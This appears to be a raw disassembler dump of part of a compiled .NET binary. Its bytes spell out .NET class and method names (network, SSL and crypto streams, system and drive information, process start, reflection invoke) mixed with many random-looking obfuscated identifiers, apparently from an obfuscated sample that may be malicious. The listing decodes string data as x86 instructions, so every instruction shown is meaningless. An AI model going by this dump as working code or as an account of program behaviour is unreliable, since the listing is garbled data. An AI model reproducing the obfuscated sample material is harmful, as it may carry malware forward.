  408fe6:	4f                   	dec    %edi
  408fe7:	4e                   	dec    %esi
  408fe8:	61                   	popa
  408fe9:	49                   	dec    %ecx
  408fea:	6d                   	insl   (%dx),%es:(%edi)
  408feb:	00 43 62             	add    %al,0x62(%ebx)
  408fee:	6e                   	outsb  %ds:(%esi),(%dx)
  408fef:	7a 71                	jp     0x409062
  408ff1:	6c                   	insb   (%dx),%es:(%edi)
  408ff2:	79 7a                	jns    0x40906e
  408ff4:	4f                   	dec    %edi
  408ff5:	6d                   	insl   (%dx),%es:(%edi)
  408ff6:	00 6c 7a 49          	add    %ch,0x49(%edx,%edi,2)
  408ffa:	51                   	push   %ecx
  408ffb:	78 57                	js     0x409054
  408ffd:	41                   	inc    %ecx
  408ffe:	64 44                	fs inc %esp
  409000:	74 73                	je     0x409075
  409002:	41                   	inc    %ecx
  409003:	4d                   	dec    %ebp
  409004:	50                   	push   %eax
  409005:	6d                   	insl   (%dx),%es:(%edi)
  409006:	00 69 4e             	add    %ch,0x4e(%ecx)
  409009:	4f                   	dec    %edi
  40900a:	55                   	push   %ebp
  40900b:	46                   	inc    %esi
  40900c:	46                   	inc    %esi
  40900d:	41                   	inc    %ecx
  40900e:	79 74                	jns    0x409084
  409010:	53                   	push   %ebx
  409011:	6d                   	insl   (%dx),%es:(%edi)
  409012:	00 65 76             	add    %ah,0x76(%ebp)
  409015:	67 4e                	addr16 dec %esi
  409017:	7a 66                	jp     0x40907f
  409019:	6d                   	insl   (%dx),%es:(%edi)
  40901a:	44                   	inc    %esp
  40901b:	62 7a 4b             	bound  %edi,0x4b(%edx)
  40901e:	4e                   	dec    %esi
  40901f:	58                   	pop    %eax
  409020:	6d                   	insl   (%dx),%es:(%edi)
  409021:	00 46 69             	add    %al,0x69(%esi)
  409024:	6c                   	insb   (%dx),%es:(%edi)
  409025:	65 53                	gs push %ebx
  409027:	74 72                	je     0x40909b
  409029:	65 61                	gs popa
  40902b:	6d                   	insl   (%dx),%es:(%edi)
  40902c:	00 4e 65             	add    %cl,0x65(%esi)
  40902f:	74 77                	je     0x4090a8
  409031:	6f                   	outsl  %ds:(%esi),(%dx)
  409032:	72 6b                	jb     0x40909f
  409034:	53                   	push   %ebx
  409035:	74 72                	je     0x4090a9
  409037:	65 61                	gs popa
  409039:	6d                   	insl   (%dx),%es:(%edi)
  40903a:	00 53 73             	add    %dl,0x73(%ebx)
  40903d:	6c                   	insb   (%dx),%es:(%edi)
  40903e:	53                   	push   %ebx
  40903f:	74 72                	je     0x4090b3
  409041:	65 61                	gs popa
  409043:	6d                   	insl   (%dx),%es:(%edi)
  409044:	00 43 72             	add    %al,0x72(%ebx)
  409047:	79 70                	jns    0x4090b9
  409049:	74 6f                	je     0x4090ba
  40904b:	53                   	push   %ebx
  40904c:	74 72                	je     0x4090c0
  40904e:	65 61                	gs popa
  409050:	6d                   	insl   (%dx),%es:(%edi)
  409051:	00 47 5a             	add    %al,0x5a(%edi)
  409054:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  40905b:	6d                   	insl   (%dx),%es:(%edi)
  40905c:	00 4d 65             	add    %cl,0x65(%ebp)
  40905f:	6d                   	insl   (%dx),%es:(%edi)
  409060:	6f                   	outsl  %ds:(%esi),(%dx)
  409061:	72 79                	jb     0x4090dc
  409063:	53                   	push   %ebx
  409064:	74 72                	je     0x4090d8
  409066:	65 61                	gs popa
  409068:	6d                   	insl   (%dx),%es:(%edi)
  409069:	00 47 78             	add    %al,0x78(%edi)
  40906c:	6f                   	outsl  %ds:(%esi),(%dx)
  40906d:	73 47                	jae    0x4090b6
  40906f:	47                   	inc    %edi
  409070:	45                   	inc    %ebp
  409071:	68 68 6c 52 7a       	push   $0x7a526c68
  409076:	61                   	popa
  409077:	6d                   	insl   (%dx),%es:(%edi)
  409078:	00 61 6e             	add    %ah,0x6e(%ecx)
  40907b:	79 54                	jns    0x4090d1
  40907d:	59                   	pop    %ecx
  40907e:	4f                   	dec    %edi
  40907f:	6b 6e 6c 68          	imul   $0x68,0x6c(%esi),%ebp
  409083:	45                   	inc    %ebp
  409084:	63 6d 00             	arpl   %ebp,0x0(%ebp)
  409087:	67 65 74 5f          	addr16 gs je 0x4090ea
  40908b:	49                   	dec    %ecx
  40908c:	74 65                	je     0x4090f3
  40908e:	6d                   	insl   (%dx),%es:(%edi)
  40908f:	00 67 65             	add    %ah,0x65(%edi)
  409092:	74 5f                	je     0x4090f3
  409094:	49                   	dec    %ecx
  409095:	73 36                	jae    0x4090cd
  409097:	34 42                	xor    $0x42,%al
  409099:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  4090a0:	74 
  4090a1:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  4090a8:	65 6d                	gs insl (%dx),%es:(%edi)
  4090aa:	00 53 79             	add    %dl,0x79(%ebx)
  4090ad:	6d                   	insl   (%dx),%es:(%edi)
  4090ae:	6d                   	insl   (%dx),%es:(%edi)
  4090af:	65 74 72             	gs je  0x409124
  4090b2:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4090b9:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  4090c0:	79 
  4090c1:	6d                   	insl   (%dx),%es:(%edi)
  4090c2:	6d                   	insl   (%dx),%es:(%edi)
  4090c3:	65 74 72             	gs je  0x409138
  4090c6:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4090cd:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  4090d4:	73 
  4090d5:	68 41 6c 67 6f       	push   $0x6f676c41
  4090da:	72 69                	jb     0x409145
  4090dc:	74 68                	je     0x409146
  4090de:	6d                   	insl   (%dx),%es:(%edi)
  4090df:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  4090e3:	6d                   	insl   (%dx),%es:(%edi)
  4090e4:	00 68 4f             	add    %ch,0x4f(%eax)
  4090e7:	5a                   	pop    %edx
  4090e8:	50                   	push   %eax
  4090e9:	74 66                	je     0x409151
  4090eb:	62 76 68             	bound  %esi,0x68(%esi)
  4090ee:	73 6e                	jae    0x40915e
  4090f0:	6a 6d                	push   $0x6d
  4090f2:	00 52 61             	add    %dl,0x61(%edx)
  4090f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4090f6:	64 6f                	outsl  %fs:(%esi),(%dx)
  4090f8:	6d                   	insl   (%dx),%es:(%edi)
  4090f9:	00 49 43             	add    %cl,0x43(%ecx)
  4090fc:	72 79                	jb     0x409177
  4090fe:	70 74                	jo     0x409174
  409100:	6f                   	outsl  %ds:(%esi),(%dx)
  409101:	54                   	push   %esp
  409102:	72 61                	jb     0x409165
  409104:	6e                   	outsb  %ds:(%esi),(%dx)
  409105:	73 66                	jae    0x40916d
  409107:	6f                   	outsl  %ds:(%esi),(%dx)
  409108:	72 6d                	jb     0x409177
  40910a:	00 45 6e             	add    %al,0x6e(%ebp)
  40910d:	75 6d                	jne    0x40917c
  40910f:	00 62 4c             	add    %ah,0x4c(%edx)
  409112:	65 53                	gs push %ebx
  409114:	6c                   	insb   (%dx),%es:(%edi)
  409115:	62 7a 6f             	bound  %edi,0x6f(%edx)
  409118:	72 59                	jb     0x409173
  40911a:	6e                   	outsb  %ds:(%esi),(%dx)
  40911b:	64 7a 6d             	fs jp  0x40918b
  40911e:	00 53 67             	add    %dl,0x67(%ebx)
  409121:	65 6a 6b             	gs push $0x6b
  409124:	61                   	popa
  409125:	51                   	push   %ecx
  409126:	4b                   	dec    %ebx
  409127:	5a                   	pop    %edx
  409128:	61                   	popa
  409129:	55                   	push   %ebp
  40912a:	47                   	inc    %edi
  40912b:	53                   	push   %ebx
  40912c:	4a                   	dec    %edx
  40912d:	41                   	inc    %ecx
  40912e:	6e                   	outsb  %ds:(%esi),(%dx)
  40912f:	00 52 52             	add    %dl,0x52(%edx)
  409132:	4f                   	dec    %edi
  409133:	54                   	push   %esp
  409134:	64 75 62             	fs jne 0x409199
  409137:	4f                   	dec    %edi
  409138:	61                   	popa
  409139:	53                   	push   %ebx
  40913a:	46                   	inc    %esi
  40913b:	4f                   	dec    %edi
  40913c:	42                   	inc    %edx
  40913d:	6e                   	outsb  %ds:(%esi),(%dx)
  40913e:	00 75 68             	add    %dh,0x68(%ebp)
  409141:	70 71                	jo     0x4091b4
  409143:	53                   	push   %ebx
  409144:	6e                   	outsb  %ds:(%esi),(%dx)
  409145:	46                   	inc    %esi
  409146:	64 54                	fs push %esp
  409148:	52                   	push   %edx
  409149:	49                   	dec    %ecx
  40914a:	69 6d 53 6e 00 6b 48 	imul   $0x486b006e,0x53(%ebp),%ebp
  409151:	4f                   	dec    %edi
  409152:	73 43                	jae    0x409197
  409154:	4f                   	dec    %edi
  409155:	49                   	dec    %ecx
  409156:	7a 50                	jp     0x4091a8
  409158:	72 46                	jb     0x4091a0
  40915a:	75 4b                	jne    0x4091a7
  40915c:	61                   	popa
  40915d:	6e                   	outsb  %ds:(%esi),(%dx)
  40915e:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  409162:	6f                   	outsl  %ds:(%esi),(%dx)
  409163:	6f                   	outsl  %ds:(%esi),(%dx)
  409164:	6c                   	insb   (%dx),%es:(%edi)
  409165:	65 61                	gs popa
  409167:	6e                   	outsb  %ds:(%esi),(%dx)
  409168:	00 72 53             	add    %dh,0x53(%edx)
  40916b:	6d                   	insl   (%dx),%es:(%edi)
  40916c:	70 6e                	jo     0x4091dc
  40916e:	69 63 4d 75 79 41 67 	imul   $0x67417975,0x4d(%ebx),%esp
  409175:	6e                   	outsb  %ds:(%esi),(%dx)
  409176:	00 74 45 70          	add    %dh,0x70(%ebp,%eax,2)
  40917a:	52                   	push   %edx
  40917b:	52                   	push   %edx
  40917c:	44                   	inc    %esp
  40917d:	7a 6c                	jp     0x4091eb
  40917f:	6a 6e                	push   $0x6e
  409181:	6a 72                	push   $0x72
  409183:	67 6e                	outsb  %ds:(%si),(%dx)
  409185:	00 4d 61             	add    %cl,0x61(%ebp)
  409188:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  40918f:	43                   	inc    %ebx
  409190:	68 61 69 6e 00       	push   $0x6e6961
  409195:	41                   	inc    %ecx
  409196:	70 70                	jo     0x409208
  409198:	44                   	inc    %esp
  409199:	6f                   	outsl  %ds:(%esi),(%dx)
  40919a:	6d                   	insl   (%dx),%es:(%edi)
  40919b:	61                   	popa
  40919c:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4091a3:	43                   	inc    %ebx
  4091a4:	75 72                	jne    0x409218
  4091a6:	72 65                	jb     0x40920d
  4091a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4091a9:	74 44                	je     0x4091ef
  4091ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ac:	6d                   	insl   (%dx),%es:(%edi)
  4091ad:	61                   	popa
  4091ae:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4091b5:	00 47 65             	add    %al,0x65(%edi)
  4091b8:	74 46                	je     0x409200
  4091ba:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  4091c1:	57 
  4091c2:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  4091c9:	78 
  4091ca:	74 65                	je     0x409231
  4091cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4091cd:	73 69                	jae    0x409238
  4091cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d1:	00 67 65             	add    %ah,0x65(%edi)
  4091d4:	74 5f                	je     0x409235
  4091d6:	4f                   	dec    %edi
  4091d7:	53                   	push   %ebx
  4091d8:	56                   	push   %esi
  4091d9:	65 72 73             	gs jb  0x40924f
  4091dc:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4091e3:	74 65                	je     0x40924a
  4091e5:	6d                   	insl   (%dx),%es:(%edi)
  4091e6:	2e 49                	cs dec %ecx
  4091e8:	4f                   	dec    %edi
  4091e9:	2e 43                	cs inc %ebx
  4091eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ec:	6d                   	insl   (%dx),%es:(%edi)
  4091ed:	70 72                	jo     0x409261
  4091ef:	65 73 73             	gs jae 0x409265
  4091f2:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  4091f9:	6c                   	insb   (%dx),%es:(%edi)
  4091fa:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  409201:	00 53 79             	add    %dl,0x79(%ebx)
  409204:	73 74                	jae    0x40927a
  409206:	65 6d                	gs insl (%dx),%es:(%edi)
  409208:	2e 53                	cs push %ebx
  40920a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40920e:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  409215:	68 
  409216:	65 6e                	outsb  %gs:(%esi),(%dx)
  409218:	74 69                	je     0x409283
  40921a:	63 61 74             	arpl   %esp,0x74(%ecx)
  40921d:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  409224:	74 65                	je     0x40928b
  409226:	6d                   	insl   (%dx),%es:(%edi)
  409227:	2e 52                	cs push %edx
  409229:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40922c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409231:	6e                   	outsb  %ds:(%esi),(%dx)
  409232:	00 58 35             	add    %bl,0x35(%eax)
  409235:	30 39                	xor    %bh,(%ecx)
  409237:	43                   	inc    %ebx
  409238:	65 72 74             	gs jb  0x4092af
  40923b:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  409242:	43                   	inc    %ebx
  409243:	6f                   	outsl  %ds:(%esi),(%dx)
  409244:	6c                   	insb   (%dx),%es:(%edi)
  409245:	6c                   	insb   (%dx),%es:(%edi)
  409246:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40924b:	6e                   	outsb  %ds:(%esi),(%dx)
  40924c:	00 4d 61             	add    %cl,0x61(%ebp)
  40924f:	6e                   	outsb  %ds:(%esi),(%dx)
  409250:	61                   	popa
  409251:	67 65 6d             	gs insl (%dx),%es:(%di)
  409254:	65 6e                	outsb  %gs:(%esi),(%dx)
  409256:	74 4f                	je     0x4092a7
  409258:	62 6a 65             	bound  %ebp,0x65(%edx)
  40925b:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  40925f:	6c                   	insb   (%dx),%es:(%edi)
  409260:	6c                   	insb   (%dx),%es:(%edi)
  409261:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409266:	6e                   	outsb  %ds:(%esi),(%dx)
  409267:	00 73 65             	add    %dh,0x65(%ebx)
  40926a:	74 5f                	je     0x4092cb
  40926c:	50                   	push   %eax
  40926d:	6f                   	outsl  %ds:(%esi),(%dx)
  40926e:	73 69                	jae    0x4092d9
  409270:	74 69                	je     0x4092db
  409272:	6f                   	outsl  %ds:(%esi),(%dx)
  409273:	6e                   	outsb  %ds:(%esi),(%dx)
  409274:	00 43 72             	add    %al,0x72(%ebx)
  409277:	79 70                	jns    0x4092e9
  409279:	74 6f                	je     0x4092ea
  40927b:	67 72 61             	addr16 jb 0x4092df
  40927e:	70 68                	jo     0x4092e8
  409280:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  409287:	74 69                	je     0x4092f2
  409289:	6f                   	outsl  %ds:(%esi),(%dx)
  40928a:	6e                   	outsb  %ds:(%esi),(%dx)
  40928b:	00 41 72             	add    %al,0x72(%ecx)
  40928e:	67 75 6d             	addr16 jne 0x4092fe
  409291:	65 6e                	outsb  %gs:(%esi),(%dx)
  409293:	74 4e                	je     0x4092e3
  409295:	75 6c                	jne    0x409303
  409297:	6c                   	insb   (%dx),%es:(%edi)
  409298:	45                   	inc    %ebp
  409299:	78 63                	js     0x4092fe
  40929b:	65 70 74             	gs jo  0x409312
  40929e:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  4092a5:	75 6d                	jne    0x409314
  4092a7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092a9:	74 45                	je     0x4092f0
  4092ab:	78 63                	js     0x409310
  4092ad:	65 70 74             	gs jo  0x409324
  4092b0:	69 6f 6e 00 65 77 77 	imul   $0x77776500,0x6e(%edi),%ebp
  4092b7:	45                   	inc    %ebp
  4092b8:	49                   	dec    %ecx
  4092b9:	44                   	inc    %esp
  4092ba:	64 62 4e 68          	bound  %ecx,%fs:0x68(%esi)
  4092be:	6d                   	insl   (%dx),%es:(%edi)
  4092bf:	57                   	push   %edi
  4092c0:	72 6e                	jb     0x409330
  4092c2:	00 4d 4d             	add    %cl,0x4d(%ebp)
  4092c5:	65 4e                	gs dec %esi
  4092c7:	71 4f                	jno    0x409318
  4092c9:	45                   	inc    %ebp
  4092ca:	42                   	inc    %edx
  4092cb:	4d                   	dec    %ebp
  4092cc:	58                   	pop    %eax
  4092cd:	54                   	push   %esp
  4092ce:	75 6e                	jne    0x40933e
  4092d0:	00 65 6e             	add    %ah,0x6e(%ebp)
  4092d3:	54                   	push   %esp
  4092d4:	47                   	inc    %edi
  4092d5:	44                   	inc    %esp
  4092d6:	69 52 73 7a 51 55 41 	imul   $0x4155517a,0x73(%edx),%edx
  4092dd:	52                   	push   %edx
  4092de:	6f                   	outsl  %ds:(%esi),(%dx)
  4092df:	00 47 42             	add    %al,0x42(%edi)
  4092e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4092e3:	53                   	push   %ebx
  4092e4:	6a 67                	push   $0x67
  4092e6:	49                   	dec    %ecx
  4092e7:	7a 7a                	jp     0x409363
  4092e9:	78 51                	js     0x40933c
  4092eb:	62 56 6f             	bound  %edx,0x6f(%esi)
  4092ee:	00 49 6d             	add    %cl,0x6d(%ecx)
  4092f1:	61                   	popa
  4092f2:	67 65 43             	addr16 gs inc %ebx
  4092f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f6:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  4092fb:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092fd:	00 46 69             	add    %al,0x69(%esi)
  409300:	6c                   	insb   (%dx),%es:(%edi)
  409301:	65 49                	gs dec %ecx
  409303:	6e                   	outsb  %ds:(%esi),(%dx)
  409304:	66 6f                	outsw  %ds:(%esi),(%dx)
  409306:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  40930a:	76 65                	jbe    0x409371
  40930c:	49                   	dec    %ecx
  40930d:	6e                   	outsb  %ds:(%esi),(%dx)
  40930e:	66 6f                	outsw  %ds:(%esi),(%dx)
  409310:	00 46 69             	add    %al,0x69(%esi)
  409313:	6c                   	insb   (%dx),%es:(%edi)
  409314:	65 53                	gs push %ebx
  409316:	79 73                	jns    0x40938b
  409318:	74 65                	je     0x40937f
  40931a:	6d                   	insl   (%dx),%es:(%edi)
  40931b:	49                   	dec    %ecx
  40931c:	6e                   	outsb  %ds:(%esi),(%dx)
  40931d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40931f:	00 43 6f             	add    %al,0x6f(%ebx)
  409322:	6d                   	insl   (%dx),%es:(%edi)
  409323:	70 75                	jo     0x40939a
  409325:	74 65                	je     0x40938c
  409327:	72 49                	jb     0x409372
  409329:	6e                   	outsb  %ds:(%esi),(%dx)
  40932a:	66 6f                	outsw  %ds:(%esi),(%dx)
  40932c:	00 43 53             	add    %al,0x53(%ebx)
  40932f:	68 61 72 70 41       	push   $0x41707261
  409334:	72 67                	jb     0x40939d
  409336:	75 6d                	jne    0x4093a5
  409338:	65 6e                	outsb  %gs:(%esi),(%dx)
  40933a:	74 49                	je     0x409385
  40933c:	6e                   	outsb  %ds:(%esi),(%dx)
  40933d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40933f:	00 50 72             	add    %dl,0x72(%eax)
  409342:	6f                   	outsl  %ds:(%esi),(%dx)
  409343:	63 65 73             	arpl   %esp,0x73(%ebp)
  409346:	73 53                	jae    0x40939b
  409348:	74 61                	je     0x4093ab
  40934a:	72 74                	jb     0x4093c0
  40934c:	49                   	dec    %ecx
  40934d:	6e                   	outsb  %ds:(%esi),(%dx)
  40934e:	66 6f                	outsw  %ds:(%esi),(%dx)
  409350:	00 53 42             	add    %dl,0x42(%ebx)
  409353:	68 4f 6a 77 7a       	push   $0x7a776a4f
  409358:	5a                   	pop    %edx
  409359:	56                   	push   %esi
  40935a:	6c                   	insb   (%dx),%es:(%edi)
  40935b:	44                   	inc    %esp
  40935c:	67 6f                	outsl  %ds:(%si),(%dx)
  40935e:	00 46 48             	add    %al,0x48(%esi)
  409361:	73 77                	jae    0x4093da
  409363:	63 6f 55             	arpl   %ebp,0x55(%edi)
  409366:	59                   	pop    %ecx
  409367:	59                   	pop    %ecx
  409368:	79 6f                	jns    0x4093d9
  40936a:	00 62 78             	add    %ah,0x78(%edx)
  40936d:	6e                   	outsb  %ds:(%esi),(%dx)
  40936e:	6e                   	outsb  %ds:(%esi),(%dx)
  40936f:	41                   	inc    %ecx
  409370:	43                   	inc    %ebx
  409371:	5a                   	pop    %edx
  409372:	6b 4e 73 76          	imul   $0x76,0x73(%esi),%ecx
  409376:	58                   	pop    %eax
  409377:	6f                   	outsl  %ds:(%esi),(%dx)
  409378:	57                   	push   %edi
  409379:	70 00                	jo     0x40937b
  40937b:	6c                   	insb   (%dx),%es:(%edi)
  40937c:	5a                   	pop    %edx
  40937d:	52                   	push   %edx
  40937e:	45                   	inc    %ebp
  40937f:	6b 52 41 45          	imul   $0x45,0x41(%edx),%edx
  409383:	56                   	push   %esi
  409384:	41                   	inc    %ecx
  409385:	43                   	inc    %ebx
  409386:	67 63 70 00          	arpl   %esi,0x0(%bx,%si)
  40938a:	53                   	push   %ebx
  40938b:	6c                   	insb   (%dx),%es:(%edi)
  40938c:	65 65 70 00          	gs gs jo 0x409390
  409390:	6e                   	outsb  %ds:(%esi),(%dx)
  409391:	61                   	popa
  409392:	6e                   	outsb  %ds:(%esi),(%dx)
  409393:	4f                   	dec    %edi
  409394:	55                   	push   %ebp
  409395:	69 41 58 73 41 5a 6e 	imul   $0x6e5a4173,0x58(%ecx),%eax
  40939c:	6c                   	insb   (%dx),%es:(%edi)
  40939d:	70 00                	jo     0x40939f
  40939f:	44                   	inc    %esp
  4093a0:	59                   	pop    %ecx
  4093a1:	5a                   	pop    %edx
  4093a2:	42                   	inc    %edx
  4093a3:	75 68                	jne    0x40940d
  4093a5:	70 6a                	jo     0x409411
  4093a7:	46                   	inc    %esi
  4093a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4093a9:	70 00                	jo     0x4093ab
  4093ab:	55                   	push   %ebp
  4093ac:	4d                   	dec    %ebp
  4093ad:	6a 67                	push   $0x67
  4093af:	43                   	inc    %ebx
  4093b0:	6d                   	insl   (%dx),%es:(%edi)
  4093b1:	70 79                	jo     0x40942c
  4093b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b4:	70 00                	jo     0x4093b6
  4093b6:	4d                   	dec    %ebp
  4093b7:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4093be:	74 2e                	je     0x4093ee
  4093c0:	43                   	inc    %ebx
  4093c1:	53                   	push   %ebx
  4093c2:	68 61 72 70 00       	push   $0x707261
  4093c7:	76 45                	jbe    0x40940e
  4093c9:	55                   	push   %ebp
  4093ca:	4e                   	dec    %esi
  4093cb:	4a                   	dec    %edx
  4093cc:	4b                   	dec    %ebx
  4093cd:	76 6f                	jbe    0x40943e
  4093cf:	65 5a                	gs pop %edx
  4093d1:	4a                   	dec    %edx
  4093d2:	67 6c                	insb   (%dx),%es:(%di)
  4093d4:	68 4f 43 71 00       	push   $0x71434f
  4093d9:	68 6e 6e 68 73       	push   $0x73686e6e
  4093de:	41                   	inc    %ecx
  4093df:	47                   	inc    %edi
  4093e0:	4c                   	dec    %esp
  4093e1:	74 46                	je     0x409429
  4093e3:	71 00                	jno    0x4093e5
  4093e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e6:	4e                   	dec    %esi
  4093e7:	73 4e                	jae    0x409437
  4093e9:	6c                   	insb   (%dx),%es:(%edi)
  4093ea:	41                   	inc    %ecx
  4093eb:	71 69                	jno    0x409456
  4093ed:	67 6e                	outsb  %ds:(%si),(%dx)
  4093ef:	65 49                	gs dec %ecx
  4093f1:	71 00                	jno    0x4093f3
  4093f3:	4a                   	dec    %edx
  4093f4:	58                   	pop    %eax
  4093f5:	56                   	push   %esi
  4093f6:	65 4a                	gs dec %edx
  4093f8:	4c                   	dec    %esp
  4093f9:	6b 52 7a 63          	imul   $0x63,0x7a(%edx),%edx
  4093fd:	48                   	dec    %eax
  4093fe:	4b                   	dec    %ebx
  4093ff:	71 00                	jno    0x409401
  409401:	51                   	push   %ecx
  409402:	56                   	push   %esi
  409403:	6a 58                	push   $0x58
  409405:	4e                   	dec    %esi
  409406:	59                   	pop    %ecx
  409407:	45                   	inc    %ebp
  409408:	61                   	popa
  409409:	58                   	pop    %eax
  40940a:	6a 52                	push   $0x52
  40940c:	79 6f                	jns    0x40947d
  40940e:	4b                   	dec    %ebx
  40940f:	71 00                	jno    0x409411
  409411:	72 52                	jb     0x409465
  409413:	75 57                	jne    0x40946c
  409415:	58                   	pop    %eax
  409416:	55                   	push   %ebp
  409417:	4a                   	dec    %edx
  409418:	78 4b                	js     0x409465
  40941a:	71 00                	jno    0x40941c
  40941c:	61                   	popa
  40941d:	48                   	dec    %eax
  40941e:	62 6d 72             	bound  %ebp,0x72(%ebp)
  409421:	4d                   	dec    %ebp
  409422:	75 4d                	jne    0x409471
  409424:	74 62                	je     0x409488
  409426:	74 52                	je     0x40947a
  409428:	71 00                	jno    0x40942a
  40942a:	67 46                	addr16 inc %esi
  40942c:	73 66                	jae    0x409494
  40942e:	4c                   	dec    %esp
  40942f:	6a 63                	push   $0x63
  409431:	44                   	inc    %esp
  409432:	58                   	pop    %eax
  409433:	57                   	push   %edi
  409434:	49                   	dec    %ecx
  409435:	6e                   	outsb  %ds:(%esi),(%dx)
  409436:	71 00                	jno    0x409438
  409438:	53                   	push   %ebx
  409439:	79 73                	jns    0x4094ae
  40943b:	74 65                	je     0x4094a2
  40943d:	6d                   	insl   (%dx),%es:(%edi)
  40943e:	2e 4c                	cs dec %esp
  409440:	69 6e 71 00 41 71 6e 	imul   $0x6e714100,0x71(%esi),%ebp
  409447:	67 74 77             	addr16 je 0x4094c1
  40944a:	70 78                	jo     0x4094c4
  40944c:	4d                   	dec    %ebp
  40944d:	50                   	push   %eax
  40944e:	6f                   	outsl  %ds:(%esi),(%dx)
  40944f:	71 00                	jno    0x409451
  409451:	55                   	push   %ebp
  409452:	63 48 73             	arpl   %ecx,0x73(%eax)
  409455:	56                   	push   %esi
  409456:	42                   	inc    %edx
  409457:	6a 52                	push   $0x52
  409459:	50                   	push   %eax
  40945a:	45                   	inc    %ebp
  40945b:	61                   	popa
  40945c:	75 77                	jne    0x4094d5
  40945e:	71 00                	jno    0x409460
  409460:	46                   	inc    %esi
  409461:	42                   	inc    %edx
  409462:	71 6a                	jno    0x4094ce
  409464:	6c                   	insb   (%dx),%es:(%edi)
  409465:	69 4d 67 71 42 72 00 	imul   $0x724271,0x67(%ebp),%ecx
  40946c:	61                   	popa
  40946d:	47                   	inc    %edi
  40946e:	76 58                	jbe    0x4094c8
  409470:	6d                   	insl   (%dx),%es:(%edi)
  409471:	67 6f                	outsl  %ds:(%si),(%dx)
  409473:	42                   	inc    %edx
  409474:	76 4b                	jbe    0x4094c1
  409476:	72 00                	jb     0x409478
  409478:	43                   	inc    %ebx
  409479:	6c                   	insb   (%dx),%es:(%edi)
  40947a:	65 61                	gs popa
  40947c:	72 00                	jb     0x40947e
  40947e:	43                   	inc    %ebx
  40947f:	68 61 72 00 42       	push   $0x42007261
  409484:	76 44                	jbe    0x4094ca
  409486:	41                   	inc    %ecx
  409487:	4b                   	dec    %ebx
  409488:	6c                   	insb   (%dx),%es:(%edi)
  409489:	4b                   	dec    %ebx
  40948a:	49                   	dec    %ecx
  40948b:	7a 6a                	jp     0x4094f7
  40948d:	4b                   	dec    %ebx
  40948e:	63 72 00             	arpl   %esi,0x0(%edx)
  409491:	49                   	dec    %ecx
  409492:	6e                   	outsb  %ds:(%esi),(%dx)
  409493:	76 6f                	jbe    0x409504
  409495:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  409499:	6d                   	insl   (%dx),%es:(%edi)
  40949a:	62 65 72             	bound  %esp,0x72(%ebp)
  40949d:	00 4d 44             	add    %cl,0x44(%ebp)
  4094a0:	35 43 72 79 70       	xor    $0x70797243,%eax
  4094a5:	74 6f                	je     0x409516
  4094a7:	53                   	push   %ebx
  4094a8:	65 72 76             	gs jb  0x409521
  4094ab:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094b2:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  4094b9:	41 
  4094ba:	43                   	inc    %ebx
  4094bb:	72 79                	jb     0x409536
  4094bd:	70 74                	jo     0x409533
  4094bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4094c0:	53                   	push   %ebx
  4094c1:	65 72 76             	gs jb  0x40953a
